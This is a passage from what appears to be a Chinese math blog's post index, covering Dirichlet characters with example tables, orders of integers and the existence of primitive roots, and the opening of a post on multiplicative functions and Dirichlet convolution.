反之，如果$\\chi$是完全积性的并且以k为周期循环，并且当$(n,k)\u0026gt;1$有$\\chi(n)=0$，则$\\chi$一定是个模k的狄利克雷特征。\nProof：\n模k的简化剩余系阶是$\\varphi(k)$，所以有$\\varphi(k)$个特征$f$。于是模k有$\\varphi(k)$个$\\chi_f$。\n证明完全积性：如果$m,n$都和$k$互素，那么根据群特征$f$可以得到$\\chi(mn)=\\chi(m)\\chi(n)$;\n如果$m,n$中有一个与k不互素，那么$mn$与k也不会互素，于是$0=\\chi(mn)=\\chi(m)\\chi(n)=0$\n证明周期性：由定义知道$\\chi(n)=f(\\hat n)$，而在简化剩余系中$f(\\hat n+k)=f(\\hat n)$\n反过来，如果$\\chi$满足$\\chi(n)=f(\\hat n) \\quad if(n,k)=1$这个条件，那么就符合狄利克雷特征的定义。\n根据阿贝尔群特征$f$的定义，我们让$f(\\hat n)=\\chi(n) \\quad if(n,k)=1$，这就定义了群$G$上的函数$f$作为群的一个特征，自然满足$\\chi$的需求，所以$\\chi$是一个狄利克雷特征。\nExample:\nk=3,$\\varphi(k)=2$:\nn 1 2 3 $\\chi_1(n)$ 1 1 0 $\\chi_2(n)$ 1 -1 0 k=4,$\\varphi(k)=2$:\nn 1 2 3 4 $\\chi_1(n)$ 1 0 1 0 $\\chi_2(n)$ 1 0 -1 0 k=5,$\\varphi(k)=4$:\nn 1 2 3 4 5 $\\chi_1(n)$ 1 1 1 1 0 $\\chi_2(n)$ 1 -1 -1 1 0 $\\chi_3(n)$ 1 i -i -1 0 $\\chi_4(n)$ 1 -i i -1 0 k=6,$\\varphi(k)=2$:\nn 1 2 3 4 5 6 $\\chi_1(n)$ 1 0 0 0 1 0 $\\chi_2(n)$ 1 0 0 0 -1 0 k=7,$\\varphi(k)=6$:\nn 1 2 3 4 5 6 7 $\\chi_1(n)$ 1 1 1 1 1 1 0 $\\chi_2(n)$ 1 1 -1 1 -1 -1 0 $\\chi_3(n)$ 1 $w^2$ $w$ $-w$ $-w^2$ -1 0 $\\chi_4(n)$ 1 $w^2$ $-w$ $-w$ $w^2$ 1 0 $\\chi_5(n)$ 1 $-w$ $w^2$ $w^2$ $-w$ 1 0 $\\chi_6(n)$ 1 $-w$ $-w^2$ $w^2$ $w$ -1 0 ","date":"2023-08-04T11:07:00Z","permalink":"https://dorinxl.github.io/p/%E8%A7%A3%E6%9E%90%E6%95%B0%E8%AE%BA%E4%B9%8B%E6%9C%89%E9%99%90%E9%98%BF%E8%B4%9D%E5%B0%94%E7%BE%A4%E5%8F%8A%E5%85%B6%E7%89%B9%E5%BE%81%E7%8B%84%E5%88%A9%E5%85%8B%E9%9B%B7%E7%89%B9%E5%BE%81/","title":"解析数论之有限阿贝尔群及其特征、狄利克雷特征"},{"content":"解析数论之原根 本文使用Typora编写，但Hugo使用KaTex渲染，可能会出现不兼容状态，如需最佳体验请前往这里\n目录 Chapter1 什么是整数的次数，什么是原根 Chapter2 谁有原根？ Chapter1 什么是整数的次数，什么是原根 Definition：\n对于$(a,m)=1,m\\ge1$，考虑所有$a,a^2,a^3,\\cdots$，我们通过欧拉定理知道有$a^{\\varphi(m)}\\equiv1\\mod{m}$。\n而满足$a^f\\equiv1\\mod{m}$的最小正整数$f$称为$a\\mod{m}$的次数，记作 $$ f=\\exp_m(a) $$ 如果$\\exp_m(a)=\\varphi(m)$,那么$a$叫做模$m$的一个原根。\nTheorem:\n**Th1：**如果$\\exp_m(a)=l;a^n\\equiv1\\mod{m};n$是正整数，那么$l|n$。 Proof:\n使用反证法，如果$l$不能整除$n$，那么有$n=ql+r,0\\le r\\le l$，那么 $$ a^n\\equiv a^{ql+r}\\equiv1\\mod{m} \\newline 而\\exp_m(a)=l意味着a^l\\equiv1\\mod{m} \\newline 所以a^{ql+r}\\equiv a^r\\equiv1\\mod{m} \\newline $$ 在上面的式子中$0\\le r\\le l$，但是根据$\\exp_m(a)=l$的定义，不可能存在$0\u0026lt; r\\le l$的数r使$a^r\\equiv1\\mod{m}$，出现矛盾，于是反证成功。\n或者$r=0$，这样一来就会出现$l|n$。\n推论：如果$\\exp_m(a)=l$，一定有$l|\\varphi(m)$\n**Th2：**如果$\\exp_m(a)=l$，那么${1,a,a^2,\\cdots,a^{l-1}}$中的元素两两不同余 假设$a^m\\equiv a^n\\mod{m}, 0\\le n\\le m\\le l-1$，那么根据$(a,m)=1$，我们有$a^{m-n} \\equiv 1\\mod{m}$，但是$0\\le m-n \\le l-1$，出现矛盾，反证成功。\n**Th3：**如果$\\exp_m(a)=l$，那么$a^k\\equiv a^h\\mod{m}$，当且仅当$k \\equiv h\\mod{l}$。 证明$\\Rightarrow$：\n如果$a^k\\equiv a^h\\mod{m}$，那么根据$(a,m)=1$有$a^{k-h}\\equiv1\\mod{m}$。\n根据Th1有$k-h=ql+r,0\\le r\\le l$，使用Th1的方式我们可以推导出$r=0$，从而有$k-h=ql \\Rightarrow l|(k-h) \\Rightarrow k\\equiv h\\mod{l}$\n证明$\\Leftarrow$：\n如果$k\\equiv h\\mod{l}$，那么$k-h=ql$，所以$a^{k-h}\\equiv1\\mod{m}$，于是$a^k\\equiv a^h\\mod{m}$。\nTh3还可以用于证明Th2，$k$和$h$选自${0,1,2\\cdots,l-1}$中的不同元素，于是${1,a,a^2,\\cdots,a^{l-1}}$中的元素两两互不同余。\n推论：如果$\\exp_m(a)=l$，那么$a^k\\equiv 1\\mod{m}$，当且仅当$k \\equiv 0\\mod{f}$。所以有$l|\\varphi(m)$\n**Th4：**令$(a.m)=1$，则$a$是模$m$的一个原根，当且仅当，${a,a^2,\\cdots,a^{\\varphi(m)}}$构成模$m$的一个简化剩余系。 证明$\\Rightarrow$：\n如果$a$是一个原根，那么有$a^{\\varphi(m)} \\equiv \\mod{m}$,那么根据Th2，我们有${1,a,a^2,\\cdots,a^{\\varphi(m)-1}}$，即${a,a^2,\\cdots,a^{\\varphi(m)}}$两两互不同余，而这样的数正好有$\\varphi(m)$个，于是构成$m$的一个简化剩余系。\n证明$\\Leftarrow$：\n有$(a,m)=1$，那么根据欧拉定理有$a^{\\varphi(m)} \\equiv \\mod{m}$，而${a,a^2,\\cdots,a^{\\varphi(m)}}$构成简化剩余系，且其中的元素两两互不同余，那么不会出现比$\\varphi(m)$更小的方幂同余1。\n**Th5：**已知$(a.m)=1$，令$\\exp_m(a)=f$，则有 $$ \\exp_m(a^k)=\\dfrac{\\exp_m(a)}{(k,f)} $$ 特别的，$\\exp_m(a^k)=\\exp_m(a)$当且仅当$(k,f)=1$。 从定义我们知道，$\\exp_m(a^k)$即是$a^k$的次数，也就是满足$a^{xk}\\equiv1\\mod{m}$的最小的$x$，使$xk\\equiv1\\mod{f}$。\n$xk\\equiv1\\mod{f}$等价于$x\\equiv0\\mod{\\dfrac{f}{d}}，d=(k,f)$。这个同余式的最小正整数解为$x=\\dfrac{f}{d}$，所以$\\exp_m(a^k)=\\dfrac{f}{d}=\\dfrac{\\exp_m(a)}{(k,f)}$\n**Th6：**令$g$是模$p$的一个原根，使$g^{p-1}\\not\\equiv1(\\mod{p^2})$，那么对每个$\\alpha\\ge2$，我们有$g^{\\varphi(p^{\\alpha-1})}\\not\\equiv1(\\mod{p^\\alpha})$ 使用归纳法证明，对$\\alpha=2$，左式就是右式。\n假设该定理对$\\alpha={2，\\cdots,}n$都成立，现在我们要证明对于$\\alpha=n+1$也成立。\n根据欧拉定理，我们有$g^{\\varphi(p^{\\alpha-1})}\\equiv1(\\mod{p^{\\alpha-1}})$，因此$g^{\\varphi(p^{\\alpha-1})}=kp^{\\alpha-1}+1$。\n而对于$\\alpha=n$满足$g^{\\varphi(p^{\\alpha-1})}\\not\\equiv1(\\mod{p^\\alpha})$，也就是$g^{\\varphi(p^{\\alpha-1})}-1\\not\\equiv0(\\mod{p^\\alpha})$,也就是$k$的因子不能含有$p$，即$p\\not|k$。\n接着我们将$g^{\\varphi(p^{\\alpha-1})}=kp^{\\alpha-1}+1$左右各自乘$p$次： $$ \\begin{align*} (g^{\\varphi(p^{\\alpha-1})})^p\u0026amp;=(kp^{\\alpha-1}+1)^p \\newline (g^{p^{\\alpha-1}-p^{\\alpha-2}})^p\u0026amp;=1+kp^\\alpha+k^2\\dfrac{p(p-1)}{2}p^{2(\\alpha-1)+rp^{3(\\alpha-1)}} \\newline 因为\\alpha\\ge2,所以\u0026amp;2\\alpha-1\\ge\\alpha+1,3\\alpha-3\\ge\\alpha+1 \\newline g^{\\varphi(p^\\alpha)}\u0026amp;\\equiv1+kp^\\alpha(\\mod{p^{\\alpha+1}}) \\end{align*} $$ 而前面证明了$k$中不含因子$p$，所以$kp^\\alpha\\not\\equiv0(\\mod{p^{\\alpha+1}})$，所以$g^{\\varphi(p^\\alpha)}-1\\not\\equiv0(\\mod{p^{\\alpha+1}})$。\n所以我们证明了对于$\\alpha=n+1$这个结论也成立，归纳证明完毕。\nChapter2 谁有原根？ Definition： 不是所有的模都有原根：\n只有当$m=1,2,4,p^\\alpha,2p^\\alpha$的时候，模才有原根。\n前三种情形容易确定：\n1的原根是0，2的原根是1，4的原根3：$3^2\\equiv 1 \\mod{4}$。\nTheorem:\n1.证明对奇素数$p$，模$p$的原根存在：\nTh：令$p$是一个奇素数，$d|p-1$，在模$p$的每一个简化剩余系中，恰有$\\varphi(d)$个$a$使得$\\exp_p(a)=d$。\n使用在第二章中用到过的证明，将$d$分为若干个集合$A(d)={x|1\\le x\\le p-1,\\exp_p(x)=d}$\n令$f(d)$表示$A(d)$中元素的个数。对每一个$d$有$f(d)\\ge0$，我们要证明$f(d)=\\varphi(d)$\n首先，$A(d)$是互不相交的，所以$\\sum_{d|p-1}f(d)=p-1$\n然后，根据欧拉函数的性质，我们有$\\sum_{d|p-1}\\varphi(d)=p-1$\n于是有$\\sum_{d|p-1}|\\varphi(d)-f(d)|=0$，\n其中每一项加起来的和为0，所以我们要证明有$f(d)\\ge\\varphi(d)$就足够了。\n如果$f(d)=0$，那么显然满足$f(d)\\ge\\varphi(d)$；\n如果$f(d)\\not=0$，也就是$A(d)$非空，那么从$A(d)$中选取一个$a$，满足$\\exp_p(a)=d$，即$a^d\\equiv1(\\mod{p})$\n对于选择的这个$a$来说，他的任意方幂都满足$a^d\\equiv1(\\mod{p})$，也就是说\n${a,a^2,\\cdots,a^d}$都是$x^d-1\\equiv0(\\mod{p})$的解。\n根据拉格朗日定理，$p$是素数，那么上面这个式子最多只有$d$个解，于是${a,a^2,\\cdots,a^d}$是$x^d-1\\equiv0(\\mod{p})$的全部解。\n于是我们扩大范围，既然$A(d)$不为空，那么$A(d)$这个集合中的所有数${1\\le a \\le p-1}$，都有$a^k,k=1,2,\\cdots$\n但不是所有的$a^k$都满足$(a^k)^d\\equiv1(\\mod{p})$，我们要找到有多少这样的$a$能够满足这个式子。\n换言之，什么时候$\\exp_p(a^k)=d$呢？\n我们有Th5的推论可以知道，想要$\\exp_p(a^k)=\\exp_p(a)=d$，那就需要$(k,d)=1$。\n换言之，${a,a^2,\\cdots,a^d}$中只有$\\varphi(d)$个数，满足$(a^k)^d\\equiv1(\\mod{p})$.\n所以，在模$p$的每一个简化剩余系中，恰有$\\varphi(d)$个$a$使得$\\exp_p(a)=d$。\n2.证明对模$p^\\alpha$的原根存在： 令$p$是一个奇素数，则有：\n1）如果$g$是模$p$的一个原根，那么对所有的$\\alpha\\ge1$，$g$是模$p^\\alpha$的原根 $\\Leftrightarrow$ $g^{p-1}\\not\\equiv1(\\mod{p^2})$\n2）模$p$至少有一个原根$g$满足$g^{p-1}\\not\\equiv1(\\mod{p^2})$，于是当$\\alpha\\ge2$的时候，模$p^\\alpha$至少有一个原根。\n证明2）：\n令$g$是模$p$的一个原根，有$g^\\varphi(p)\\equiv1(\\mod{p})$\n如果$g^{p-1}\\equiv1(\\mod{p^2})$，我们能证明有另一个原根$g_1=g+p$满足$g_1^{p-1}\\not\\equiv1(\\mod{p^2})$\n我们展开$g_1^{p-1}$： $$ g_1^{p-1}=(g+p)^{p-1}=g^{p-1}+(p-1)g^{p-2}p+tp^2 \\newline \\equiv g^{p-1}+(p^2-p)g^{p-2}(\\mod{p^2}) \\newline \\equiv 1-pg^{p-2}(\\mod{p^2}) $$ 不能有$pg^{p-2}\\equiv0(\\mod{p^2}) $，因为这样会出现$g^{p-2}\\equiv0(\\mod{p})$与$g$是模$p$的一个原根矛盾。\n于是$g_1^{p-1}\\not\\equiv1(\\mod{p^2})$。\n证明1）：$\\Rightarrow$\n如果$g$是模$p$的一个原根，那么对所有的$\\alpha\\ge1$，$g$是模$p^\\alpha$的原根.\n那么我们让$\\alpha=2$，就满足b的定义。\n反过来，$g$是模$p$的一个原根，$g^{p-1}\\not\\equiv1(\\mod{p^2})$。要证明$g$是模$p^\\alpha$的原根：\n令$t=\\exp_{p^\\alpha}(g)$，现在要证明$t=\\varphi(p^\\alpha)$\n因为$g^t\\equiv1(\\mod{p^\\alpha})$，我们有$g^t\\equiv1(\\mod{p})$，所以$\\varphi(p)|t,t=q\\varphi(p)$\n而$t|\\varphi(p^\\alpha)$，所以$q\\varphi(p)|\\varphi(p^\\alpha)=p^{\\alpha-1}(p-1)$，所以$q(p-1)|p^{\\alpha-1}(p-1),q|p^{\\alpha-1}$，所以$q=p^\\beta,(\\beta\\le\\alpha-1)$\n于是$t=q\\varphi(p)=p^\\beta(p-1)$\n如果我们能证明$\\beta=\\alpha-1$，那么就是说$t=p^{\\alpha-1}(p-1)=\\varphi(p^{\\alpha})$\n假设法证明，如果$\\beta\u0026lt;\\alpha-1$，那么$\\beta\\le\\alpha-2，t=p^\\beta(p-1)|p^{\\alpha-2}(p-1)=\\varphi(p^{\\alpha-1})$\n我们有$t=\\exp_{p^\\alpha}(g)$，而$\\varphi(p^{\\alpha-1})$是$t$的倍数，所以$g^{\\varphi(p^{\\alpha-1})}\\equiv1(\\mod{p^\\alpha})$\nTh6证明了这个式子是不成立的，所以出现矛盾，证明完毕。\n模$2p^\\alpha$的原根存在：\n如果$p$是一个奇素数并且$\\alpha\\ge1$，那么存在模$p^\\alpha$的一个奇数原根$g$，每一个这样的$g$也是模$2p^\\alpha$的原根。\n如果$g$是模$p^\\alpha$的一个原根，那么$g+p^\\alpha$也是一个原根。$g$和$g+p^\\alpha$必有一个是奇数。所以必然存在奇数原根。\n令$g$是模$p^\\alpha$的一个奇数原根，令$f=\\exp_{2p^\\alpha}(g)$，有$f|\\varphi(2p^\\alpha)$，现在要证明$f=\\varphi(2p^\\alpha)$。\n$\\varphi(2p^\\alpha)=\\varphi(2)\\varphi(p^\\alpha)=\\varphi(p^\\alpha)$，所以$f|\\varphi(p^\\alpha)$，证明$f=\\varphi(2p^\\alpha)$变成了证明$f=\\exp_{p^\\alpha}(g)$。\n而$g^f\\equiv1(\\mod{2p^\\alpha})$，所以$g^f\\equiv1(\\mod{p^\\alpha})$。(定义)\n所以根据Th1：$\\varphi(p^\\alpha)|f$。\n所以$f=\\varphi(p^\\alpha)=\\varphi(2p^\\alpha)$\n$2^\\alpha$没有原根\n令$x$是一个奇数，对$\\alpha\\ge3$，我们有$x^{\\dfrac{\\varphi(2^\\alpha)}{2}}\\equiv1(\\mod{2^\\alpha})$，所以$2^\\alpha$没有原根。\n用归纳法证明：\n首先，当$\\alpha=3$，命题即是说$x^2\\equiv1(\\mod{8}),x=1,3,5,7$。所以没有原根。\n假设对$\\alpha$成立，只要证明对$\\alpha+1$成立，命题就成立。\n对$\\alpha$成立的话，$x^{\\dfrac{\\varphi(2^\\alpha)}{2}}=t2^\\alpha+1$。\n平方得到$x^{\\varphi(2^\\alpha)}=1+t^22^{2\\alpha}+t2^{\\alpha+1} \\equiv 1(\\mod{2^{\\alpha+1}})$\n又因为$\\varphi(2^\\alpha)=2^{\\alpha-1}=\\dfrac{\\varphi(2^{\\alpha+1})}{2}$\n所以$x^{\\varphi(2^\\alpha)} \\equiv x^{\\dfrac{\\varphi(2^\\alpha)}{2}}\\equiv 1(\\mod{2^{\\alpha+1}})$\n其他情况下原根不存在：\n给定$m\\ge1$，$m\\not={1,2,4,p^\\alpha,2p^\\alpha}$，其中$p$是奇素数。对于任何一个与$m$互素的$a$，我们有$a^{\\dfrac{\\varphi(m)}{2}}\\equiv1(\\mod{m})$。于是m没有原根\n因为当$\\alpha\\ge3$的时候，模$2^\\alpha$没有原根，所以我们假设$m$分解为 $$ m=2^\\alpha p_1^{\\alpha_1}p_2^{\\alpha_2} \\cdots p_s^{\\alpha_s} \\newline \\varphi(m)=\\varphi(2^\\alpha)\\varphi(p_1^{\\alpha_1})\\cdots\\varphi(p_s^{\\alpha_s}) $$ 其中$p_i$是奇素数，$s\\ge1,\\alpha\\ge0$。\n由于$m\\not={1,2,4,p^\\alpha,2p^\\alpha}$，所以：\n当$s=1$，有$\\alpha\\ge2$；\n当$\\alpha=0或1$，有$s\\ge2$。\n我们希望$a^{\\dfrac{\\varphi(m)}{2}}\\equiv1(\\mod{m})$，令$g$是模$p_1^{\\alpha_1}$的一个原根，选k使$a\\equiv g^k(\\mod{p_1^{\\alpha_1}})$.\n于是$a^{\\dfrac{\\varphi(m)}{2}}\\equiv g^{\\dfrac{\\varphi(m)k}{2}}\\equiv g^{t\\varphi(p_1^{\\alpha_1})}(\\mod{p_1^{\\alpha_1}})$\n其中，$t=k\\varphi(2^\\alpha)\\varphi(p_1^{\\alpha_1})\\cdots\\varphi(p_s^{\\alpha_s})\\dfrac{1}{2}$\n如果$\\alpha\\ge2$，那么因子$\\varphi(2^\\alpha)$是偶数；\n如果$\\alpha=0,1$则$s\\ge2$，那么因子$\\varphi(p_2^{\\alpha_2})$也是偶数，（欧拉函数性质算出来变成$p_2^{\\alpha_2}(p_2-1)$，后面括号里面的会提供一个2​）\n所以$t$是一个整数。 $a^{\\dfrac{\\varphi(m)}{2}} \\equiv g^{t\\varphi(p_1^{\\alpha_1})}\\equiv 1 (\\mod{p_1^{\\alpha_1}})$\n扩展成$a^{\\dfrac{\\varphi(m)}{2}} \\equiv 1 (\\mod{p_i^{\\alpha_i}})$\n目前为止，我们还需要证明这个同余式对模$2^\\alpha$也成立。\n根据模$2^\\alpha$不存在原根的定理，我们有 $$ a^{\\dfrac{\\varphi(2^\\alpha)}{2}}\\equiv 1(\\mod{2^\\alpha}),(\\alpha\\ge3) $$ 而$\\varphi(2^\\alpha)|\\varphi(m)$，所以$a^{\\dfrac{\\varphi(m)}{2}}\\equiv 1(\\mod{2^\\alpha}),(\\alpha\\ge3)$\n接下来只剩下$\\alpha\\le2$的情况了，对于这种情况，根据定义我们有 $$ a^{\\varphi(2^\\alpha)}\\equiv1(\\mod{2^\\alpha}) $$ 我们想要将$\\varphi(2^\\alpha)$转换成$\\dfrac{\\varphi(m)}{2}$，就需要$\\varphi(2^\\alpha)|\\dfrac{\\varphi(m)}{2}$，实际上这是成立的，因为既然$m$中$s\\ge1$，那么$\\varphi(m)=\\varphi(2^\\alpha)\\varphi(p_1^{\\alpha_1})\\cdots\\varphi(p_s^{\\alpha_s})$中就肯定能分出一个$2r\\varphi(2^\\alpha)$，其中$r$是整数。\n于是对所有的$\\alpha$都成立： $$ a^{\\dfrac{\\varphi(2^\\alpha)}{2}}\\equiv 1(\\mod{2^\\alpha}),(\\alpha\\ge3) $$ 最后我们乘在一起，得到 $$ a^{\\dfrac{\\varphi(m)}{2}}\\equiv1(\\mod{m}) $$ 这证明，$a$不能是模$m$的原根。\n","date":"2023-08-02T15:13:00Z","permalink":"https://dorinxl.github.io/p/%E8%A7%A3%E6%9E%90%E6%95%B0%E8%AE%BA%E4%B9%8B%E5%8E%9F%E6%A0%B9/","title":"解析数论之原根"},{"content":" 本文使用Typora编写，但Hugo使用KaTex渲染，可能会出现不兼容状态，如需最佳体验请前往这里\n目录 Chapter1 积性函数与狄利克雷乘积 Chapter2 广义卷积 Chapter3 形式幂级数和数论函数的贝尔级数 Chapter4 数论函数的导数 Chapter1 积性函数与狄利克雷乘积 Definition：\n有数论函数$f$,如果$f$不恒为零，且对任意的$(m,n)=1$有$f(mn)=f(m)f(n)$，那么这个数论函数$f$被称为是积性的。 如果对于任意的$m,n$都有$f(mn)=f(m)f(n)$，那么这个数论函数$f$被称为是完全积性的。 Examples:\n令幂函数$f_\\alpha(n) = n^\\alpha$,这里的$\\alpha$是固定的实数或复数。这个函数是完全积性函数。$u=f_0$是完全积性的。\n$$ \\begin{align*} f_\\alpha(mn) \u0026amp;= (mn)^\\alpha \\newline \u0026amp;=(m^\\alpha)(n^\\alpha) \\newline \u0026amp;=f_\\alpha(m)f_\\alpha(n) \\newline \\end{align*} $$\n恒等函数$I(n)=[\\dfrac{1}{n}]$是完全积性的。\n$$ I(mn) = [\\dfrac{1}{mn}] =\\begin{cases}1,\u0026amp;\\text{if $m,n=1$} \\newline 0,\u0026amp;\\text{if $m\u0026gt;1 || n\u0026gt;1$}\\end{cases} $$\n$$ I(m)I(n) = [\\dfrac{1}{m}][\\dfrac{1}{n}] =\\begin{cases}1,\u0026amp;\\text{if $m,n=1$} \\newline 0,\u0026amp;\\text{if $m\u0026gt;1 || n\u0026gt;1$}\\end{cases} $$\n莫比乌斯函数$\\mu()$是积性的但不是完全积性的.\n考虑两个互素的整数$m,n$。\n若$m,n$中任意一个的因子表示为$p^\\alpha,\\alpha\\ge2$,那么有 $$ \\mu(mn)=\\mu(m)\\mu(n) = 0 $$ 若$m,n$中没有上述情况，那么可以将$m,n$表示为： $$ m = p_1p_2 \\cdots p_s \\newline n = q_1q_2 \\cdots q_t \\newline \\Downarrow \\newline \\mu(m) = (-1)^s \\newline \\mu(n) = (-1)^t \\newline \\mu(mn) = (-1)^{(s+t)} = \\mu(m)\\mu(n) $$ 这表明莫比乌斯函数$\\mu$是积性函数。但其不是完全积性函数，因为： $$ \\mu(4)=0 \\newline \\mu(2)\\mu(2) = 1 $$\n欧拉函数$\\varphi()$是积性函数但不是完全积性函数。\n是积性函数：由欧拉函数的性质可以得到： $$ \\varphi(mn) = \\varphi(m)\\varphi(n) $$ 不是完全积性函数： $$ \\varphi(4) = 2 \\newline \\varphi(2)\\varphi(2) = 1 $$\n如果$f,g$是积性函数/完全积性函数，那么$fg,\\dfrac{f}{g}$也是积性函数/完全积性函数。\n以$fg$为例： $$ \\begin{align*} fg(mn) \u0026amp;= f(mn)g(mn) \\newline \u0026amp;= f(m)f(n)g(m)g(n) \\newline \u0026amp;= f(m)g(m)f(n)g(n) \\newline \u0026amp;= fg(m)fg(n) \\end{align*} $$\nTheorem:\nTh1:如果$f$是积性的，那么$f(1)=1$\nProof:\n对任意n，有$(n,1)=1$，由积性函数的性质我们可以得到：$f$不恒为零，且有$f(n)=f(1)f(n)$，于是存在n，使$f(n)\\neq0,f(1)=1$\nTh2:给定$f$，且$f(1)=1$，那么：\n$f$是积性的 $\\Longleftrightarrow$ $f(p_1^{\\alpha_1}p_2^{\\alpha_2}\\cdots p_r^{\\alpha_ r}) =f(p_1^{\\alpha_1})f(p_2^{\\alpha_2})\\cdots f(p_r^{\\alpha_r})$ 如果$f$是积性的，那么：$f$是完全积性的 $\\Longleftrightarrow$ $f(p^\\alpha) = f(p)^\\alpha$ Proof：\nTh2.1: 如果$f$是积性的，显然$p_1^{\\alpha_1}p_2^{\\alpha_2}\\cdots p_r^{\\alpha_ r}$中的$p_1^{\\alpha_1},p_2^{\\alpha_2},\\cdots ,p_r^{\\alpha_ r}$这些数字都是互素的，那么根据积性函数的定义就有： $$ f(p_1^{\\alpha_1}p_2^{\\alpha_2}\\cdots p_r^{\\alpha_ r}) =f(p_1^{\\alpha_1}p_2^{\\alpha_2}\\cdots p_{r-1}^{\\alpha_ {r-1}})f(p_r^{\\alpha_r}) =f(p_1^{\\alpha_1})f(p_2^{\\alpha_2})\\cdots f(p_r^{\\alpha_r}) $$ 反过来，我们有$f(p_1^{\\alpha_1}p_2^{\\alpha_2}\\cdots p_r^{\\alpha_ r}) =f(p_1^{\\alpha_1})f(p_2^{\\alpha_2})\\cdots f(p_r^{\\alpha_r})$，想证明$f$是积性函数， 我们取$(m,n)=1,m=p_1^{\\alpha_1}p_2^{\\alpha_2}\\cdots p_r^{\\alpha_ r},n=q_1^{\\beta_1}q_2^{\\beta_2}\\cdots q_t^{\\beta_ t}$. $$ \\begin{align*} f(mn)\u0026amp;=f(p_1^{\\alpha_1}p_2^{\\alpha_2}\\cdots p_r^{\\alpha_ r}q_1^{\\beta_1}q_2^{\\beta_2}\\cdots q_t^{\\beta_ t}) \\newline \u0026amp;=f(p_1^{\\alpha_1})f(p_2^{\\alpha_2})\\cdots f(p_r^{\\alpha_r})f(q_1^{\\beta_1})f(q_2^{\\beta_2})\\cdots f(q_r^{\\beta_r}) \\newline \u0026amp;=f(p_1^{\\alpha_1}p_2^{\\alpha_2}\\cdots p_r^{\\alpha_ r})f(q_1^{\\beta_1}q_2^{\\beta_2}\\cdots q_t^{\\beta_ t}) \\newline \u0026amp;=f(m)f(n) \\end{align*} $$ Th2.2:如果$f$是完全积性的，那么 $$ f(p^\\alpha) = f(p^{\\alpha-1})f(p) = f(p)^\\alpha $$ 反过来，我们有$f$是积性函数，$f(p^\\alpha) = f(p)^\\alpha$,想证明$f$是完全积性函数，我们取整数$m,n\\ge1,m=p_1^{\\alpha_1}p_2^{\\alpha_2}\\cdots p_r^{\\alpha_ r},n=p_1^{\\beta_1}p_2^{\\beta_2}\\cdots p_t^{\\beta_ t}.\\alpha和\\beta可能为0$ $$ \\begin{align*} f(m)f(n)\u0026amp;=f(p_1^{\\alpha_1}p_2^{\\alpha_2}\\cdots p_r^{\\alpha_ r})f(p_1^{\\beta_1}p_2^{\\beta_2}\\cdots p_t^{\\beta_ t}) \\newline \u0026amp;=f(p_1^{\\alpha_1})f(p_2^{\\alpha_2})\\cdots f(p_r^{\\alpha_r})f(p_1^{\\beta_1})f(p_2^{\\beta_2})\\cdots f(p_r^{\\beta_r}) \\newline \u0026amp;=f(p_1)^{\\alpha_1}f(p_2)^{\\alpha_2}\\cdots f(p_r)^{\\alpha_r}f(p_1)^{\\beta_1}f(p_2)^{\\beta_2}\\cdots f(p_r)^{\\beta_r} \\newline \u0026amp;=f(p_1)^{\\alpha_1+\\beta_1}f(p_2)^{\\alpha_2+\\beta_2}\\cdots f(p_r)^{\\alpha_r+\\beta_r} \\newline \u0026amp;=f(p_1^{\\alpha_1+\\beta_1})f(p_2^{\\alpha_2+\\beta_2})\\cdots f(p_r^{\\alpha_r+\\beta_r}) \\newline \u0026amp;=f(mn) \\end{align*} $$\nTh3:如果$f$和$g$是积性的，那么他们的狄利克雷卷积也是积性的。\nProof:令$h=fg$，选取互素的整数$m,n$，那么： $$ h(mn) = \\sum_{c|mn}f(c)g(\\dfrac{mn}{c}) $$ $m,n$的每一个因子c都可以写成$c=ab$的形式，其中$a|m,b|n,(a,b)=1$ $$ \\begin{align} h(m)h(n)\u0026amp;=f(m)g(m)f(n)g(n) \\newline \u0026amp;=\\sum_{a|m}f(a)g(\\dfrac{m}{a})\\sum_{b|n}f(b)g(\\dfrac{n}{b}) \\newline \u0026amp;=\\sum_{a|m \\newline b|n}f(a)f(b)g(\\dfrac{m}{a})g(\\dfrac{n}{b}) \\newline 根据整除的推论： \\newline (m,n)=1,mn的因子可以唯一由 \\newline m的因子和n的因子的乘积表示 \u0026amp;=\\sum_{ab|mn}f(ab)g(\\dfrac{mn}{ab}) \\newline \u0026amp;=h(mn) \\end{align*} $$ **Node:**两个完全积性函数的狄利克雷乘积不一定是完全积性的。\nTh4：如果$g$和$f*g$都是积性的，那么$f$也是积性的。\nProof：\n假设$f$不是积性的，那么我们如果推出$f*g$不是积性的，即可通过矛盾证明该结论。\n选择$(m,m)=1$使得$f(mn) \\ne f(m)f(n)$，让$m,n$尽量的小。\n如果$mn=1$，那么$f(1) \\ne f(1)f(1),f(1)\\ne 1$。因为$h(1)=(f*g)(1)=f(1)g(1)=f(1)\\ne 1$，所以h不是积性函数。\n如果$mn\u0026gt;1$，选择$(a,b)=1,ab\u0026lt;mn$，使得$f(ab)=f(a)f(b)$。 $$ \\begin{align*} (fg)(mn)\u0026amp;=\\sum\\limits_{a|m \\newline b|n \\newline ab\u0026lt;mn}f(ab)g(\\dfrac{mn}{ab})+f(mn)g(1) \\newline \u0026amp;=\\sum_{a|m}f(a)g(\\dfrac{m}{a})+\\sum_{b|n}f(b)g(\\dfrac{n}{b})-f(m)f(n)+f(mn) \\newline \u0026amp;=(fg)(m)(fg)(n)-f(n)f(m)+f(mn) \\end{align} $$ 而$f(mn)\\ne f(m)f(n)$，所以$h(mn)\\ne h(m)h(n)$，$h$不是积性的。\nTh5：如果$g$是积性的，那么它的狄利克雷逆$g^{-1}$也是积性的。\n我们知道$g$是积性的，而$g*g^{-1}=I$也是积性的，那么根据Th4我们得出Th5。\nTh6：如果$f$是积性的，那么有：$f$是完全积性的 $\\Longleftrightarrow$ $f^{-1}(n) = \\mu(n)f(n)$,对所有的$n\\ge1$\nProof：\n证明$\\Rightarrow$:想通过“$f$是完全积性的”这一条件证明“$f^{-1}(n) = \\mu(n)f(n)$”,我们设$g(n)=\\mu(n)f(n)$ $$ \\begin{align*} (gf)(n)\u0026amp;=\\sum_{d|n}\\mu(d)f(d)f(\\dfrac{n}{d}) \\newline \u0026amp;=\\sum_{d|n}\\mu(d)f(n) \\newline \u0026amp;=f(n)\\sum_{d|n}\\mu(d) \\newline \u0026amp;=f(n)I(n) \\newline \u0026amp;=I(n) \\end{align} $$ 既然有$(g*f)=I$，那么有$f^{-1}(n) = \\mu(n)f(n)$\n证明$\\Leftarrow$：想通过“$f$是积性的，且$f^{-1}(n) = \\mu(n)f(n)$”这一条件证明“$f$是完全积性的”,我们只需要证出对所有素数$p$有$f(p^\\alpha)=f(p)^\\alpha$即可。 